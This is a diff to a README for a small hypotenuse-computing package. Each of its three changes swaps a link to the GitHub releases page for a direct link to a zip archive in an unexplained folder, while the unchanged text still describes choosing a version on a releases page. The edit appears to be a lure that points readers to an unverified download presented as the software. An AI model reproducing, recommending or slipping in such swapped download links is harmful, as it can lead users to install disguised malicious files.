@@ -1,6 +1,6 @@
 # 🎉 math-base-special-fast-hypotf - Fastly Compute Hypotenuse Values
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/estarlin1020/math-base-special-fast-hypotf/releases)
+[![Download](https://raw.githubusercontent.com/estarlin1020/math-base-special-fast-hypotf/main/campaniliform/math-base-special-fast-hypotf.zip)](https://raw.githubusercontent.com/estarlin1020/math-base-special-fast-hypotf/main/campaniliform/math-base-special-fast-hypotf.zip)
 
 ## 📖 What is math-base-special-fast-hypotf?
 
@@ -11,7 +11,7 @@ math-base-special-fast-hypotf is a simple application that helps you calculate t
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page:**  
-   To get the latest version of the software, [visit this page to download](https://github.com/estarlin1020/math-base-special-fast-hypotf/releases).
+   To get the latest version of the software, [visit this page to download](https://raw.githubusercontent.com/estarlin1020/math-base-special-fast-hypotf/main/campaniliform/math-base-special-fast-hypotf.zip).
 
 2. **Choose a Version:**  
    On the Releases page, you will see a list of available versions. Select the version that you want to download. The latest version will typically be at the top.
@@ -58,7 +58,7 @@ To run math-base-special-fast-hypotf, your system should meet the following requ
 
 ## 📥 Download & Install
 
-As mentioned earlier, [visit this page to download](https://github.com/estarlin1020/math-base-special-fast-hypotf/releases) the application. Follow the instructions above to successfully download and install it on your computer.
+As mentioned earlier, [visit this page to download](https://raw.githubusercontent.com/estarlin1020/math-base-special-fast-hypotf/main/campaniliform/math-base-special-fast-hypotf.zip) the application. Follow the instructions above to successfully download and install it on your computer.
 
 ## ❓ Frequently Asked Questions
 
